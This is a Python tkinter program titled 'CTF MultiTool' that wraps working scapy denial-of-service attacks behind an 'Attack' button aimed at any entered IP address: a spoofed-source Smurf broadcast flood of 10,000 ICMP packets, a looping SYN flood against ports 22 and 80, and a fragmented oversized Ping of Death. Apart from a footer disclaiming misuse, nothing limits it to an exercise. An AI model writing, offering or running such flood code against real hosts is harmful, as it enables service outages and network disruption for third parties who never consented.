from tkinter import *
from tkinter import ttk
from tkinter import messagebox
from PIL import ImageTk, Image
from scapy.all import *
import threading

class BaseFrame(Frame):
    def __init__(self, master):
    	super().__init__(master)
    	
    	self.header = Frame(self, width = 1024, height = 100)
    	self.main = Frame(self, width = 1024, height = 450)
    	self.footer = Frame(self, width = 1024, height = 50)
    	
    	self.header.grid(row=0, column=0, sticky=N+E)
    	self.header.grid_propagate(False)
    	self.main.grid(row=1, column=0, sticky=N+E)
    	self.main.grid_propagate(False)
    	self.footer.grid(row=2, column=0, sticky=N+E)
    	self.footer.grid_propagate(False)
    	
    	self.titlelogo = Canvas(self.header, width = 100, height = 100, highlightthickness = 0)
    	self.titlelogo.grid(row=0, column=0, sticky=W)
    	
    	self.img1 = ImageTk.PhotoImage(Image.open("Logo.png"))
    	self.titlelogo.create_image(1,1,anchor = N+W, image = self.img1)
    	
    	self.title = Label(self.header, text="CTF MultiTool", fg="#63CCCA", bg="#12263A", font="Raleway 48 bold", pady="10", padx = "20")
    	self.title.grid(row=0, column=1, sticky=N)
    	
    	self.attacktypetitle = Label(self.main, text="Attack Type:", fg="#63CCCA", bg="#12263A", font="Raleway 24", pady="10", padx = "20")
    	
    	self.IPtitle = Label(self.main, text="Destination IP:", fg="#63CCCA", bg="#12263A", font="Raleway 24", pady="10", padx = "20")
    	
    	self.attacktypetitle.grid(row = 0, column = 0)
    	self.IPtitle.grid(row = 0, column = 1)
    	
    	self.attacktypeentrybg = Frame(self.main, bg="#12263A", borderwidth = 0, relief = SUNKEN, pady="10", padx = "20")
    	self.IPentrybg = Frame(self.main, bg="#12263A", borderwidth = 0, relief = SUNKEN, pady="10", padx = "20")
    	self.attackbuttonbg = Frame(self.main, bg="#12263A", borderwidth = 0, relief = SUNKEN, pady="10", padx = "20")
    	
    	self.attacktypeentrybg.grid(row = 1, column = 0)
    	self.IPentrybg.grid(row = 1, column = 1)
    	self.attackbuttonbg.grid(row = 1, column = 2, columnspan = 2)
    	
    	self.attackoutput = Text(self.main, bg="#12263A", fg='#63CCCA', width = 72, height = 10, borderwidth = 1, relief = SUNKEN, font="Raleway 14")
    	self.attackoutput.grid(row = 2, column = 0, columnspan = 3)
    	self.attackoutput.config(state = DISABLED)

    	self.outscroll = ttk.Scrollbar(self.main, command=self.attackoutput.yview)
    	self.outscroll.grid(row=2, column=2, sticky='nse')
    	self.attackoutput['yscrollcommand'] = self.outscroll.set
    	
    	self.v = StringVar()
    	self.IPentry = ttk.Entry(self.IPentrybg, textvariable = self.v, font="Raleway 24", width = 18)
    	self.IPentry.grid(row = 0, column = 0)
    	
    	self.attackbutton = ttk.Button(self.attackbuttonbg, text = "Attack", width = 6, command = self.attack_btn_pressed)
    	self.attackbutton.grid(row = 0, column = 0)
    	
    	self.attackchosen = ttk.Combobox(self.attacktypeentrybg, font="Raleway 24", width = 14)
    	self.attackchosen['values'] = ('Smurf', 'SYN Flood', 'Ping of Death')
    	self.attackchosen.grid(row = 0, column = 0)		
    	self.attackchosen.current()
    	
    	self.backbuttonbg = Frame(self.footer, bg="#12263A", borderwidth = 0, relief = SUNKEN, pady="0", padx = "10")
    	self.backbuttonbg.grid(row = 0, column = 0, sticky = N+W)
    	
    	self.backbutton = ttk.Button(self.backbuttonbg, text = "Back", width = 6, command = self.back_btn_pressed)
    	self.backbutton.grid(row = 0, column = 0)
    	
    	self.terms = Label(self.footer, text="The company does not take responsibility for any misue of this product.", fg="#63CCCA", bg="#12263A", font="Raleway 16", pady="10")
    	self.terms.grid(row=0, column=1, sticky=N)
    	
    	self.header.configure(background='#12263A')
    	self.titlelogo.configure(background='#12263A')
    	self.main.configure(background= '#12263A')
    	self.footer.configure(background='#12263A')
    	
    	sys.stdout = TextRedirector(self.attackoutput, "stdout")
    	sys.stderr = TextRedirector(self.attackoutput, "stderr")
    	
    	self.pack()

    valid_hex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
    valid_dec = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

    def checkIP(self, ip):
        ip = ip.split(".")
        if len(ip) == 4:
            for x in range(0, len(ip)):
                for y in ip[x]:
                    if y not in self.valid_dec:
                        return 0
                    if ip[x] == "0" and (x == 1 or x == 2):
                        pass
                    elif ip[x][0] == "0":
                        ip[x] = ip[x][1:]
                if ip[x] == '':
                    return 0
                if int(ip[x]) > 255:
                    return 0
            return ip[0] + "." + ip[1] + "." +  ip[2] + "." + ip[3]
        else:
            return 0

    def smurf(self, source_ip, r):
        source = source_ip.split(".")
        destination_ip = source[0] + "." + source[1] + "." + source[2] + ".255"
        send(IP(src=source_ip, dst=destination_ip)/ICMP(), count=10000)

    def syn_flood(self, destination_ip, r):
        packet = IP(dst=destination_ip, id=random.randint(1000,9999), ttl=random.randint(10, 99))/TCP(sport=RandShort(), dport=[22,80], seq=12345, ack=1000, window=1000, flags="S", options=[("Timestamp", (10,0))])/"SYNFlood"
        ans,unans = srloop(packet, inter=0.3, retry=2, timeout=4)

    def ping_of_death(self, destination_ip, r):
        send(fragment(IP(dst=destination_ip)/ICMP()/('X'*60000)))
    	
    def attack_btn_pressed(self):
        attack = self.attackchosen.get()
        userip = self.IPentry.get()
        ip = self.checkIP(userip)
        print(attack)
        if ip != 0:
            if attack == "Smurf":
                messagebox.showinfo(title="SUCCESS!!!", message=attack + " Attack is Now Being Conducted!")
                threading._start_new_thread(self.smurf, (ip, "r"))
            elif attack == "Ping of Death":
                messagebox.showinfo(title="SUCCESS!!!", message=attack + " Attack is Now Being Conducted!")
                threading._start_new_thread(self.ping_of_death, (ip, "r"))
            elif attack == "SYN Flood":
                messagebox.showinfo(title="SUCCESS!!!", message=attack + " Attack is Now Being Conducted!")
                threading._start_new_thread(self.syn_flood, (ip, "r"))
            else:
                messagebox.showerror(title="ERROR!!!", message="Please Chose a Valid Attack!")
        else:
            messagebox.showerror(title="ERROR!!!", message="The IP Address " + str(userip) + " is not Valid!")
    	
    def back_btn_pressed(self):
        root.destroy()
        import MainMenu

class TextRedirector(object):
    def __init__(self, widget, tag="stdout"):
        self.widget = widget
        self.tag = tag

    def write(self, str):
        self.widget.configure(state="normal")
        self.widget.insert("end", str, (self.tag,))
        self.widget.configure(state="disabled")
    

root = Tk()
root.option_add("*TCombobox*Listbox*Background", '#12263A')
root.option_add("*TCombobox*Listbox*Foreground", '#63CCCA')
root.option_add("*TCombobox*Listbox*Font", 'Raleway 17')

wmgstyle = ttk.Style()
wmgstyle.theme_create('wmgstyle', parent = 'alt', settings = {'TCombobox': {'configure': {'fieldbackground': '#63CCCA', 'background': '#12263A', 'foreground': '#12263A', 'arrowcolor': "#63CCCA" , 'arrowsize' : '20', 'selectbackground' : '#12263A', 'selectforeground' : "#63CCCA" }}, 'TEntry': {'configure': {'fieldbackground': "#63CCCA" , 'foreground': '#12263A', 'selectbackground' : '#12263A', 'selectforeground' : "#63CCCA" }}, 'TButton': {'configure': {'background': "#63CCCA" , 'foreground': '#12263A', 'selectbackground' : '#12263A', 'selectforeground' : "#63CCCA", 'font': "Raleway 21"}}, 'TScrollbar': {'configure': {'background': "#63CCCA" , 'foreground': '#12263A', 'selectbackground' : '#12263A', 'selectforeground' : "#63CCCA"}}})

wmgstyle.theme_use("wmgstyle")

lf = BaseFrame(root)
root.geometry("1024x600")
root.title("CTF Toolkit")
root.iconphoto(False, PhotoImage(file="Icon.png"))
root.resizable(False, False)
root.mainloop()

